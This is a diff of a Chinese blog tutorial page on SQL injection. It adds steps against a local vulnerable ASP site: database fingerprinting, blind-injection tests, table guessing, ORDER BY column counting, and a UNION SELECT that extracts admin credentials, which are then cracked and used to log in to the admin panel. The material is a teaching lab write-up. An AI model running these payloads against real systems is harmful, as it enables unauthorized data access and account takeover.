@@ -5,21 +5,29 @@
   
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <link rel="dns-prefetch" href="https://xianyuchen0803.github.io">
+  <link rel="dns-prefetch" href="http://www.laxianyu.com">
   <title>注入攻击 | Xianyu Chen</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="一. 注入攻击的本质(两个必要条件)1). 用户能够控制输入2). 原本程序要执行的代码，拼接了用户数据，对用户的输入没有过滤操作">
 <meta property="og:type" content="article">
 <meta property="og:title" content="注入攻击">
-<meta property="og:url" content="https://xianyuchen0803.github.io/2019/06/10/注入攻击/index.html">
+<meta property="og:url" content="http://www.laxianyu.com/2019/06/10/注入攻击/index.html">
 <meta property="og:site_name" content="Xianyu Chen">
 <meta property="og:description" content="一. 注入攻击的本质(两个必要条件)1). 用户能够控制输入2). 原本程序要执行的代码，拼接了用户数据，对用户的输入没有过滤操作">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://ps792o7x9.bkt.clouddn.com/sql1.png">
 <meta property="og:image" content="http://ps792o7x9.bkt.clouddn.com/sql2.png">
 <meta property="og:image" content="http://ps792o7x9.bkt.clouddn.com/sql3.png">
+<meta property="og:image" content="http://ps792o7x9.bkt.clouddn.com/sql5.png">
+<meta property="og:image" content="http://ps792o7x9.bkt.clouddn.com/sql6.png">
 <meta property="og:image" content="http://ps792o7x9.bkt.clouddn.com/sql4.png">
-<meta property="og:updated_time" content="2019-06-10T03:25:26.109Z">
+<meta property="og:image" content="http://ps792o7x9.bkt.clouddn.com/sql7.png">
+<meta property="og:image" content="http://ps792o7x9.bkt.clouddn.com/sql8.png">
+<meta property="og:image" content="http://ps792o7x9.bkt.clouddn.com/sql9.png">
+<meta property="og:image" content="http://ps792o7x9.bkt.clouddn.com/sql10.png">
+<meta property="og:image" content="http://ps792o7x9.bkt.clouddn.com/sql11.png">
+<meta property="og:image" content="http://ps792o7x9.bkt.clouddn.com/sql12.png">
+<meta property="og:updated_time" content="2019-06-10T06:39:57.302Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="注入攻击">
 <meta name="twitter:description" content="一. 注入攻击的本质(两个必要条件)1). 用户能够控制输入2). 原本程序要执行的代码，拼接了用户数据，对用户的输入没有过滤操作">
@@ -203,6 +211,8 @@
 <p>此页面存在SQL注入漏洞<br><code>http://localhost:8003/Production/PRODUCT_DETAIL.asp?id=1142&#39;</code>  （加一个单引号’）</p>
 <p><img src="http://ps792o7x9.bkt.clouddn.com/sql3.png" alt="avatar"></p>
 <p>发现web服务器开启了<b>错误回显</b>，从错误信息可以知道，服务器采用的是Access作为数据库。</p>
+<h2 id="可以用下面这种方式判断数据库类型"><a href="#可以用下面这种方式判断数据库类型" class="headerlink" title="可以用下面这种方式判断数据库类型"></a>可以用下面这种方式判断数据库类型</h2><p><code>and exists (select * from msysobjects)&gt;0</code>   ——&gt;access数据库,msysobjects为Access数据库内置表<br><img src="http://ps792o7x9.bkt.clouddn.com/sql5.png" alt="avatar"></p>
+<p><code>and exists (select * from sysobjects)&gt;0</code>    ——&gt;sql server数据库<br><img src="http://ps792o7x9.bkt.clouddn.com/sql6.png" alt="avatar"></p>
 <h1 id="盲注-Blind-Injection"><a href="#盲注-Blind-Injection" class="headerlink" title="盲注(Blind Injection)"></a>盲注(Blind Injection)</h1><p>当服务器关闭了错误回显时，攻击者必须找到一个方向来验证注入的SQL语句是否得到执行，攻击者为了应对这种情况，研究了<b>盲注</b>的技巧。</p>
 <p>还是以上面的网站为例</p>
 <p>构造如下条件语句：<br><code>http://localhost:8003/Production/PRODUCT_DETAIL.asp?id=1142 and 1=1</code> 此语句返回正常网页，那么就可以判断”id”参数存在SQL注入的漏洞。</p>
@@ -211,6 +221,18 @@
 <p><code>http://localhost:8003/Production/PRODUCT_DETAIL.asp?id=1142 or 1=2</code>  这句才是返回正常页面</p>
 <p>综上判断方法：<br>and 1=1  正常页面<br>and 1=2  错误页面</p>
 <p>or 1=1   错误页面<br>or 1=2   正常页面</p>
+<h1 id="判断表的内容"><a href="#判断表的内容" class="headerlink" title="判断表的内容"></a>判断表的内容</h1><h2 id="判断是否存在admin表"><a href="#判断是否存在admin表" class="headerlink" title="判断是否存在admin表"></a>判断是否存在admin表</h2><p><code>and exists (select * from 表名)</code>   —–&gt;表名需要自己一个一个试：比如admin, user_admin,administrator….<br><img src="http://ps792o7x9.bkt.clouddn.com/sql7.png" alt="avatar"><br>根据上图，可知存在表admin</p>
+<h2 id="判断查询的表的字段个数，利用order-by-x来判断"><a href="#判断查询的表的字段个数，利用order-by-x来判断" class="headerlink" title="判断查询的表的字段个数，利用order by x来判断"></a>判断查询的表的字段个数，利用<code>order by x</code>来判断</h2><p><code>http://localhost:8003/Production/PRODUCT_DETAIL.asp?id=1142 order by 22</code>   返回正确<br><code>http://localhost:8003/Production/PRODUCT_DETAIL.asp?id=1142 order by 23</code>   返回错误</p>
+<p>说明该表有22个字段</p>
+<h2 id="通过admin表找有用的信息"><a href="#通过admin表找有用的信息" class="headerlink" title="通过admin表找有用的信息"></a>通过admin表找有用的信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8003/Production/PRODUCT_DETAIL.asp?id=1142 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin</span><br></pre></td></tr></table></figure>
+<p><img src="http://ps792o7x9.bkt.clouddn.com/sql8.png" alt="avatar"></p>
+<p>1,2,3,4…这里的几个数字纯粹是凑数的，凑够和union关键字前面的那个表的字段数一样，不然没法拼接成一个表,通过返回结果，可以看到第3和第15个字段为用户名和密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8003/Production/PRODUCT_DETAIL.asp?id=1142 union select 1,2,admin,4,5,6,7,8,9,10,11,12,13,14,password,16,17,18,19,20,21,22 from admin</span><br></pre></td></tr></table></figure>
+<p><img src="http://ps792o7x9.bkt.clouddn.com/sql9.png" alt="avatar"></p>
+<p>密码a48e190fafc257d3需要MD5解密</p>
+<p><img src="http://ps792o7x9.bkt.clouddn.com/sql10.png" alt="avatar"></p>
+<h2 id="通过后台扫描工具扫描到后台，再利用用户名和密码即可登录后台"><a href="#通过后台扫描工具扫描到后台，再利用用户名和密码即可登录后台" class="headerlink" title="通过后台扫描工具扫描到后台，再利用用户名和密码即可登录后台"></a>通过后台扫描工具扫描到后台，再利用用户名和密码即可登录后台</h2><p><img src="http://ps792o7x9.bkt.clouddn.com/sql11.png" alt="avatar"></p>
+<p><img src="http://ps792o7x9.bkt.clouddn.com/sql12.png" alt="avatar"></p>
 
       
 
@@ -224,7 +246,7 @@
             
             <br>
             <strong>本文链接：</strong>
-            https://xianyuchen0803.github.io/2019/06/10/注入攻击/
+            http://www.laxianyu.com/2019/06/10/注入攻击/
             <br>
             <strong>版权声明：</strong>
             本作品采用
@@ -313,7 +335,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://xianyuchen0803.github.io/2019/06/10/注入攻击/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://www.laxianyu.com/2019/06/10/注入攻击/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -356,7 +378,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#一-注入攻击的本质-两个必要条件"><span class="toc-number">1.</span> <span class="toc-text">一. 注入攻击的本质(两个必要条件)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL注入-SQL-Injection"><span class="toc-number">2.</span> <span class="toc-text">SQL注入(SQL Injection)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入的原理"><span class="toc-number">2.1.</span> <span class="toc-text">SQL注入的原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#在本地搭建一个存在sql注入漏洞的网站为例"><span class="toc-number">2.2.</span> <span class="toc-text">在本地搭建一个存在sql注入漏洞的网站为例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#盲注-Blind-Injection"><span class="toc-number">3.</span> <span class="toc-text">盲注(Blind Injection)</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#一-注入攻击的本质-两个必要条件"><span class="toc-number">1.</span> <span class="toc-text">一. 注入攻击的本质(两个必要条件)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL注入-SQL-Injection"><span class="toc-number">2.</span> <span class="toc-text">SQL注入(SQL Injection)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入的原理"><span class="toc-number">2.1.</span> <span class="toc-text">SQL注入的原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#在本地搭建一个存在sql注入漏洞的网站为例"><span class="toc-number">2.2.</span> <span class="toc-text">在本地搭建一个存在sql注入漏洞的网站为例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#可以用下面这种方式判断数据库类型"><span class="toc-number">2.3.</span> <span class="toc-text">可以用下面这种方式判断数据库类型</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#盲注-Blind-Injection"><span class="toc-number">3.</span> <span class="toc-text">盲注(Blind Injection)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#判断表的内容"><span class="toc-number">4.</span> <span class="toc-text">判断表的内容</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#判断是否存在admin表"><span class="toc-number">4.1.</span> <span class="toc-text">判断是否存在admin表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#判断查询的表的字段个数，利用order-by-x来判断"><span class="toc-number">4.2.</span> <span class="toc-text">判断查询的表的字段个数，利用order by x来判断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#通过admin表找有用的信息"><span class="toc-number">4.3.</span> <span class="toc-text">通过admin表找有用的信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#通过后台扫描工具扫描到后台，再利用用户名和密码即可登录后台"><span class="toc-number">4.4.</span> <span class="toc-text">通过后台扫描工具扫描到后台，再利用用户名和密码即可登录后台</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
